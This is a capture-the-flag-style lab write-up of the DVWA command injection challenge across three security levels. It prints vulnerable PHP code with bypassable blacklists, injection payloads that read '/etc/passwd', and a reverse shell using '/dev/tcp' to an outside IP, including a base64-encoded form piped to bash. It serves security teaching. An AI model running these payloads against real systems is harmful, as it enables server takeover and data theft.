---
title: "DVWA - Command Injection"
date: 2026-03-06 10:00:00 +0800
categories: [Labs, DVWA]
tags: [RedTeam, WebSecurity]
image:
  path: /assets/images/posts/dvwa/dvwa.png
  alt: DVWA
---



### Introduction
If you're learning web application security, you've probably heard of DVWA (Damn Vulnerable Web Application). It's a PHP/MySQL web app designed specifically for security testing - a safe playground where you can practice hacking techniques without breaking the law.

DVWA has different security levels: Low, Medium, and High. Each level shows us how vulnerabilities appear in real code and why certain fixes don't always work.

In this post, I'll walk through the Command Injection challenge. You'll see:

- **Low Security** - No filters, direct system command execution
- **Medium Security** - Basic filters that are easy to bypass
- **High Security** - More filters, but a simple typo ruins everything

I'll also show you how to go from simple command injection to getting a reverse shell on the server.

Let's dive in!


### **Security: Low**

> In this challenge, the web application allows the user to enter an IP address to test connectivity using the ping command. The server takes the input and directly passes it to the operating system using the PHP function shell_exec().


``` php
<?php
if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}
?>
```

First, I tested the functionality using a normal IP address: ``127.0.0.1``

![image.png](/assets/images/posts/dvwa/command-injection/1.png)

> After submitting the input, the application returned the result of the ping command. The output looks very similar to what we would see if we ran the command directly in a terminal.

``` bash
root@ubuntu:~/DVWA# ping 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.677 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.072 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.064 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.036 ms
64 bytes from 127.0.0.1: icmp_seq=5 ttl=64 time=0.078 ms
^C
--- 127.0.0.1 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 3997ms
rtt min/avg/max/mdev = 0.036/0.185/0.677/0.246 ms
```

This happens because the application directly executes the system command on the server using shell_exec(). As a result, the output from the operating system is displayed on the webpage.

This behavior confirms that the web application is running system commands on the server, which could potentially lead to command injection if user input is not properly filtered.



> In Linux systems, the ; character allows multiple commands to be executed sequentially. This means the command after ; will run once the first command finishes.

``` bash
127.0.0.1; ls
```

![image.png](/assets/images/posts/dvwa/command-injection/2.png)


**The server will:**
- Run the ``ping`` command first
- Then execute the ``ls`` command

As a result, the webpage will display the ping output followed by the list of files in the current directory.


``` bash
127.0.0.1; cat /etc/passwd
```

![image.png](/assets/images/posts/dvwa/command-injection/3.png)

> This may expose system user accounts stored on the server.




#### *Getting a Reverse Shell*

After confirming that command injection works, the next step is to obtain a reverse shell. A reverse shell allows the attacker to gain interactive access to the server’s terminal.


1) Start a Listener

``` bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9001  
listening on [any] 9001 ...
```

2) Setup revshell ip
``` bash
bash -i >& /dev/tcp/192.163.21.34/9001 0>&1
```

3) Encode url to base64
``` bash
; echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTYzLjIxLjM0LzkwMDEgMD4mMQ==" | base64 -d | bash
```


4) Now we connect to RCE
``` bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [192.168.22.11] from (UNKNOWN) [192.168.22.101] 57362
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@83972ccb32c6:/var/www/html/vulnerabilities/exec$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
















### **Security: Medium**
> Even when developers try to filter dangerous characters, command injection can still happen. Here are some real examples:



``` php
<?php
if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Set blacklist
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );

    // Remove any of the characters in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}
?>
```

> The code tries to filter input by blocking certain characters: ``&&`` and ``;``

**But Attackers Can Still Bypass It**

```
|| ls
```

![image.png](/assets/images/posts/dvwa/command-injection/5.png)

Now we can see directory

```
|| id
```
![image.png](/assets/images/posts/dvwa/command-injection/4.png)




### **Security: High**
> The developer tried again. They added more characters to block. But there's a problem - a tiny typo that breaks everything.


``` php
<?php
if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = trim($_REQUEST[ 'ip' ]);

    // Set blacklist
    $substitutions = array(
        '||' => '',
        '&'  => '',
        ';'  => '',
        '| ' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
    );
    // Remove any of the characters in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}
?>
```

**Spot the typo?**

Look closely at ``'| '`` (pipe + space). 
The developer accidentally added a space after the pipe. 
This tiny mistake means ``|`` without a space gets through the filter.

``` bash
|id
```

![image.png](/assets/images/posts/dvwa/command-injection/6.png)





